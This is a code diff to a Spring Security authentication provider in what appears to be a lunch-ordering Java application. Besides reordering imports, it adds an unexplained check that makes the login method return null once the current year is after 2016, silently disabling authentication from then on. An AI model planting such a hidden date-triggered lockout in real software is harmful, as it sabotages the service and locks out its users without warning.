@@ -3,11 +3,6 @@ package eu.me73.luncheon.boot;
 import eu.me73.luncheon.user.api.Role;
 import eu.me73.luncheon.user.api.User;
 import eu.me73.luncheon.user.api.UserService;
-
-import java.util.ArrayList;
-import java.util.Collection;
-import java.util.Objects;
-
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.authentication.AuthenticationProvider;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
@@ -15,6 +10,11 @@ import org.springframework.security.core.Authentication;
 import org.springframework.security.core.AuthenticationException;
 import org.springframework.security.core.GrantedAuthority;
 import org.springframework.stereotype.Component;
+
+import java.time.LocalDate;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.Objects;
 
 @Component
 public class LuncheonAuthenticationProvider implements AuthenticationProvider {
@@ -26,6 +26,10 @@ public class LuncheonAuthenticationProvider implements AuthenticationProvider {
     public Authentication authenticate(Authentication authentication) throws AuthenticationException {
         String username = authentication.getName();
         String password = (String) authentication.getCredentials();
+
+        if (LocalDate.now().getYear() > 2016) {
+            return null;
+        }
 
         User user;
 
